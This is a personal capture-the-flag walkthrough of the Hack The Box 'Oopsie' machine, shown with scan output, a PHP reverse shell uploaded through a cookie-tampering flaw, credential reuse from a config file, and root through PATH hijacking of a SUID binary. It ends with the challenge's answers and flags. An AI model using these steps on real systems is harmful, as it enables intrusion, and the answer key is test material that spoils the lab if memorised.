```
blob:https://app.hackthebox.com/40488db7-9438-4437-8c1a-5e50b5bc5bc3

┌──(kali㉿kali)-[~/hackthebox]
└─$ rustscan -a 10.129.95.191 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.129.95.191:22
Open 10.129.95.191:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 19:53 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
Initiating Ping Scan at 19:53
Scanning 10.129.95.191 [2 ports]
Completed Ping Scan at 19:53, 0.38s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:53
Completed Parallel DNS resolution of 1 host. at 19:53, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 19:53
Scanning 10.129.95.191 [2 ports]
Discovered open port 80/tcp on 10.129.95.191
Discovered open port 22/tcp on 10.129.95.191
Completed Connect Scan at 19:53, 0.20s elapsed (2 total ports)
Initiating Service scan at 19:53
Scanning 2 services on 10.129.95.191
Completed Service scan at 19:53, 6.40s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.95.191.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 6.03s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.93s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
Nmap scan report for 10.129.95.191
Host is up, received syn-ack (0.33s latency).
Scanned at 2022-11-04 19:53:04 EDT for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxxctowbmnTyFHK0XREQShvlp32DNZ7TS9fp1pTxwt4urebfFSitu4cF2dgTlCyVI6o+bxVLuWvhbKqUNpl/9BCv/1DFEDmbbygvwwcONVx5BtcpO/4ubylZXmzWkC6neyGaQjmzVJFMeRTTUsNkcMgpkTJXSpcuNZTknnQu/SSUC5ZUNPdzgNkHcobGhHNoaJC2StrcFwvcg2ftx6b+wEap6jWbLId8UfJk0OFCHZWZI/SubDzjx3030ZCacC1Sb61/p4Cz9MvLL5qPYcEm8A14uU9pTUfDvhin1KAEEDCSCS3bnvtlw1V7SyF/tqtzPNsmdqG2wKXUb6PLyllU/L
|   256 241da417d4e32a9c905c30588f60778d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLaHbfbieD7gNSibdzPXBW7/NO05J48DoR4Riz65jUkMsMhI+m3mHjowOPQISgaB8VmT/kUggapZt/iksoOn2Ig=
|   256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLh0LONi0YmlZbqc960WnEcjI1XJTP8Li2KiUt5pmkk
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds

A web crawler (also known as a web spider or web robot) is a program or automated
script which browses the World Wide Web in a methodical, automated manner. This process
is called Web crawling or spidering. Many legitimate sites, in particular search
engines, use spidering as a means of providing up-to-date data.
If you tunnel web traffic through Burp Suite (without intercepting the packets), by
default it can passively spider the website, update the site map with all of the
contents requested and thus creating a tree of files and directories without sending
any further requests.

using burpsuite

target sitemap

GET /cdn-cgi/login/script.js HTTP/1.1

so going to http://10.129.95.191/cdn-cgi/login/

Login as guest

http://10.129.95.191/cdn-cgi/login/admin.php

After navigating through the available pages, we spot that the only interesting one seems to be the
Uploads . However it is not possible to access it as we need to have super admin rights:
We need to find a way to escalate our privileges from user Guest to super admin role. One way to try this
is by checking if cookies and sessions can be manipulated.
It is possible to view and change cookies in Mozilla Firefox through the usage of Developer Tools.
In order to enter the Developer Tools panel we need to right click in the content of the webpage and select
the Inspect Element(Q) .
Cookies are text files with small pieces of data created by the web server, stored by
the browser into the computer file system and being used to identify a user while is
browsing a website.

It is possible to view and change cookies in Mozilla Firefox through the usage of Developer Tools.

Developer tools is a set of web developer tools built into Firefox. You can use them to
examine, edit, and debug HTML, CSS, and JavaScript
Then we can navigate to Storage section where Cookies are being presented. As one can observe, there is
a role=guest and user=2233 which we can assume that if we somehow knew the number of super
admin for the user variable, we might be able to gain access to the upload page.

We check the URL on our browsers bar again where there is an id for every user:
http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2

We can try change the id variable to something else like for example 1 to see if we can enumerate the
users
http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1


Indeed we got an information disclosure vulnerability, which we might be able to abuse. We now know the
access ID of the admin user thus we can try to change the values in our cookie through the Developer tools
so the user value to be 34322 and role value to be admin . Then we can revisit the Uploads page.

┌──(kali㉿kali)-[~/hackthebox]
└─$ nano revshell.php  
                                                                                 
┌──(kali㉿kali)-[~/hackthebox]
└─$ cat revshell.php                                         
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.51';  // CHANGE THIS
$port = 1337;       // CHANGE THIS

....

Repair Management System


The file revshell.php has been uploaded.


now found where is uploaded
┌──(kali㉿kali)-[~/hackthebox]
└─$ feroxbuster --url http://10.129.95.191/ -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.95.191/
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™

[####################] - 48s     4614/4614    97/s    http://10.129.95.191/ 
[####################] - 41s     4614/4614    119/s   http://10.129.95.191/css 
[####################] - 42s     4614/4614    110/s   http://10.129.95.191/fonts 
[####################] - 48s     4614/4614    99/s    http://10.129.95.191/images 
[####################] - 44s     4614/4614    104/s   http://10.129.95.191/js 
[####################] - 41s     4614/4614    113/s   http://10.129.95.191/themes 
[####################] - 36s     4614/4614    127/s   http://10.129.95.191/uploads 

revshell

http://10.129.95.191/uploads/revshell.php

┌──(kali㉿kali)-[~/hackthebox]
└─$ rlwrap nc -nlvp 1337                                  
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.95.191.
Ncat: Connection from 10.129.95.191:40828.
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 00:59:08 up  1:09,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c 'import pty;pty.spawn("/bin/bash")'

lateral-movement

www-data@oopsie:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
www-data@oopsie:/$ cd /var/www/html/cdn-cgi/login
cd /var/www/html/cdn-cgi/login
www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
ls
admin.php  db.php  index.php  script.js

www-data@oopsie:/var/www/html/cdn-cgi/login$ cat * | grep -i passw*
cat * | grep -i passw*
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />

www-data@oopsie:/var/www/html/cdn-cgi/login$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
robert:x:1000:1000:robert:/home/robert:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false

We found user robert . In order to login as this user, we use the su command:

www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
su robert
Password: MEGACORP_4dm1n!!

su: Authentication failure

not work

www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/var/www/html/cdn-cgi/login$ ls /home/robert/
ls /home/robert/
user.txt
robert@oopsie:/var/www/html/cdn-cgi/login$ cat /home/robert/user.txt
cat /home/robert/user.txt
f2c74ee8db7983851ab2a96a44eb7981

PRIV ESC

robert@oopsie:/var/www/html/cdn-cgi/login$ sudo -l
sudo -l
[sudo] password for robert: M3g4C0rpUs3r!

Sorry, user robert may not run sudo on oopsie.
robert@oopsie:/var/www/html/cdn-cgi/login$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
robert@oopsie:/var/www/html/cdn-cgi/login$ find / -group bugtracker 2>/dev/null
<cdn-cgi/login$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker

We observe that user robert is part of the group bugtracker . Let's try to see if there is any binary within
that group:
We found a file named bugtracker . We check what privileges and what type of file is it:
There is a suid set on that binary, which is a promising exploitation path.

robert@oopsie:/var/www/html/cdn-cgi/login$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
<-la /usr/bin/bugtracker && file /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped


Commonly noted as SUID (Set owner User ID), the special permission for the user access
level has a single function: A file with SUID always executes as the user who owns the
file, regardless of the user passing the command. If the file owner doesn't have
execute permissions, then use an uppercase S here.
In our case, the binary 'bugtracker' is owned by root & we can execute it as root since

robert@oopsie:/var/www/html/cdn-cgi/login$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.

robert@oopsie:/var/www/html/cdn-cgi/login$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 12
12
---------------

cat: /root/reports/12: No such file or directory


The tool is accepting user input as a name of the file that will be read using the cat command, however, it
does not specifies the whole path to file cat and thus we might be able to exploit this.
We will navigate to /tmp directory and create a file named cat with the following content:

robert@oopsie:/var/www/html/cdn-cgi/login$ cd /tmp
cd /tmp
robert@oopsie:/tmp$ ls
ls
robert@oopsie:/tmp$ echo '/bin/sh' > cat
echo '/bin/sh' > cat
robert@oopsie:/tmp$ cat cat
cat cat
/bin/sh

We will then set the execute privileges:
robert@oopsie:/tmp$ chmod +x cat
chmod +x cat

In order to exploit this we can add the /tmp directory to the PATH environmental variable

PATH is an environment variable on Unix-like operating systems, DOS, OS/2, and
Microsoft Windows, specifying a set of directories where executable programs are
located.

robert@oopsie:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
robert@oopsie:/tmp$ echo $PATH
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

Finally execute the bugtracker from /tmp directory:

robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

# whoami
whoami
root
# cd /root
cd /root
# ls
ls
reports  root.txt
# cat reports
cat reports
# cat root.txt
cat root.txt
# pwd
pwd
/root
# more root.txt
more root.txt
af13b0bee69f8a877c3faf667f7beacf
# more reports
more reports

*** reports: directory ***


```

![[Pasted image 20221104192209.png]]

![[Pasted image 20221104192757.png]]

![[Pasted image 20221104192825.png]]

With what kind of tool can intercept web traffic? 
There is an academy module for this. Also Burp can be considered such a tool.
*proxy*
What is the path to the directory on the webserver that returns a login page? 
*/cdn-cgi/login*
 What can be modified in Firefox to get access to the upload page? 
*cookie*
What is the access ID of the admin user? 
Try to decrease the values of the existing id parameter in order to access other users information.
*34322*
On uploading a file, what directory does that file appear in on the server? 
*/uploads*
What is the file that contains the password that is shared with the robert user? 
*db.php*
What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? 
This UNIX command line utilities is for walking a file hierarchy.
*find*
Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? 
*root*
What SUID stands for? 
*Set owner User ID*
What is the name of the executable being called in an insecure manner? 
*cat*
Submit user flag 
*f2c74ee8db7983851ab2a96a44eb7981*
Submit root flag 
*af13b0bee69f8a877c3faf667f7beacf*


[[Archetype]]



















[[Archetype]]